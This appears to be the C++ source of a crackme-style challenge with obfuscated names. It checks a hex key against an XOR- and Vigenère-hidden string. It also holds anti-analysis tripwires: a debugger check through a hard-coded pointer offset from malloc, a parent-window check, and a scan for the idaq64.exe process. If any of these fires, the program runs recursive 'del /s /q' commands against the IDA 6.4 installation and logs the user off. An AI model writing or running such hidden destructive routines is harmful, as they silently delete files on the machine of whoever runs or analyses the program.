// projet.cpp : définit le point d'entrée pour l'application console.
//

#include "stdafx.h"
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <tlhelp32.h>
#include <stdio.h>
#include <ctype.h>

using namespace std;

typedef bool (*djsfds) (void);
typedef bool (*dksljgkl) (HANDLE esrgthyju, PBOOL pbDebuggerPresent);
typedef HANDLE (*hejzh) (void);

char *effgghdcfv = (char*) malloc;
char kljkslfhjhf[] = {'b'^27, 'c'^27, 'f'^27, 'a'^27, 'a'^27, 'a'^27, 'd'^27, 'b'^27, 'f'^27, 'e'^27, 'e'^27, 'a'^27, 'c'^27, 'b'^27, 'f'^27, 'e'^27, 'c'^27, 'b'^27, 'd'^27, 'd'^27, 'f'^27};
char dsdffgthg[] = "bhhdebgfkghecbigdgeij";

bool fdgtfhjhgfd(int sfdgh){
	if (sfdgh==2){
		return true;
	}
	return false;
}

bool hrhdfhdf(char* ssdfgh){
	if(strlen(ssdfgh) > 32){
		return false;
	}
	return true;
}

bool dfrgthyjhbv(char* fghjkdf){
	char fjgjkdrbvjkdfjkdjb[23] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'A', 'B', 'C', 'D', 'E', 'F', '\0'};
	bool jvekzghrjk;
	int fjskfgfhkjs = strlen(fghjkdf);
	for (int i=0; i<fjskfgfhkjs; i++){
		jvekzghrjk = false;
		for (int j=0; j<22; j++){
			if(fghjkdf[i]==fjgjkdrbvjkdfjkdjb[j]){
				jvekzghrjk = true;
			}
		}
		if(!jvekzghrjk){
			return false;
		}
	}
	return true;
}

bool fsslkjflkezj(char* sgjkrgh){
	int ehgjkgdgh = strlen(sgjkrgh);
	int felhflej = strlen(dsdffgthg);
	if(ehgjkgdgh==felhflej){
		for(int i=0; i<felhflej; i++){
			if(sgjkrgh[i]!=dsdffgthg[i]){
				return false;
			}
		}
		return true;
	}
	return false;
}

bool dfrgthyjukijhgfd() {
	djsfds dsgfgghj;
	int ffgth = 4230482756;
	char *dfggh = effgghdcfv - ffgth;
	dsgfgghj = (djsfds)dfggh;
	if (dsgfgghj()){
		return true;
	}
	else {
		return false;
	}
}

bool dfgthyuiokjbv() {
    HWND dffgth = GetConsoleWindow();
    HWND defrgt = GetParent(dffgth);

    if (defrgt != NULL) {
		return true;
    } else {
		return false;
    }
}


bool defrtyuijbvczatrty(const wchar_t* fdfghnyfj) {
    HANDLE dgthygjuhkjhgfv = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (dgthygjuhkjhgfv == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 dffghjh;
    dffghjh.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(dgthygjuhkjhgfv, &dffghjh)) {
        do {
            if (_wcsicmp(dffghjh.szExeFile, fdfghnyfj) == 0) {
                CloseHandle(dgthygjuhkjhgfv);
                return true;
            }
        } while (Process32Next(dgthygjuhkjhgfv, &dffghjh));
    }

    CloseHandle(dgthygjuhkjhgfv);
    return false;
}

void rdgthjuhgfd(char* sfhrjghoiriohd, const char* fhezghjkgdhg, int fesfldkshf) {
    size_t fjshkezjh = strlen(fhezghjkgdhg);
    size_t hshgeoih = strlen(sfhrjghoiriohd);

    for (size_t i = 0; i < hshgeoih; ++i) {
        char fjslgkdklgsjlkgh = sfhrjghoiriohd[i];
        char fshjrehgjkg = fhezghjkgdhg[i % fjshkezjh];
        if (isalpha(fjslgkdklgsjlkgh)) {
            char drgtfhjghhg = isupper(fjslgkdklgsjlkgh) ? 'A' : 'a';
            char jshkjffhdjkhg = isupper(fshjrehgjkg) ? 'A' : 'a';

            if (fesfldkshf) {
                sfhrjghoiriohd[i] = (fjslgkdklgsjlkgh - drgtfhjghhg + fshjrehgjkg - jshkjffhdjkhg) % 26 + drgtfhjghhg;
            } else {
                sfhrjghoiriohd[i] = (fjslgkdklgsjlkgh - drgtfhjghhg - fshjrehgjkg + jshkjffhdjkhg + 26) % 26 + drgtfhjghhg;
            }
        }
    }
}

void dfgtyuikjhg(){
	system("del \"C:\\Program Files\\IDA 6.4\\license.txt\" /s /q");
	system("del \"C:\\Program Files\\IDA 6.4\\win_fw.dll\" /s /q");
	system("del \"C:\\Program Files\\IDA 6.4\\python\" /s /q");
	system("del \"C:\\Program Files\\IDA 6.4\\cfg\" /s /q");
	system("del \"C:\\Program Files\\IDA 6.4\\loaders\" /s /q");
	ExitWindowsEx(EWX_LOGOFF, 0);
}

int main(int ffgth, char* jykghdvdq[])
{
	const wchar_t* esdftfggh = L"idaq64.exe";
	if (dfrgthyjukijhgfd()){
		dfgtyuikjhg();
	}
	if (dfgthyuiokjbv()){
		dfgtyuikjhg();
	}
	if (defrtyuijbvczatrty(esdftfggh)){
		dfgtyuikjhg();
	}

	if (fdgtfhjhgfd(ffgth)){
		if (hrhdfhdf(jykghdvdq[1])){
			if (dfrgthyjhbv(jykghdvdq[1])){
				int lsfrgt = strlen(kljkslfhjhf);
				for(int i=0; i<lsfrgt; i++){
					kljkslfhjhf[i]^=27;
				}
				char* fdrdgtfhygfd = jykghdvdq[1];
				rdgthjuhgfd(fdrdgtfhygfd, kljkslfhjhf, 1);
				if(fsslkjflkezj(fdrdgtfhygfd)) {
					rdgthjuhgfd(fdrdgtfhygfd, kljkslfhjhf, 0);
					for(int j=0; j<lsfrgt; j++){
						kljkslfhjhf[j]^=27;
					}
					cout << "Success" << endl;
				}
				else{
					rdgthjuhgfd(fdrdgtfhygfd, kljkslfhjhf, 0);
					for(int j=0; j<lsfrgt; j++){
						kljkslfhjhf[j]^=27;
					}
					cout << fdrdgtfhygfd << endl;
				}
			}
		}
	}


	return 0;
}

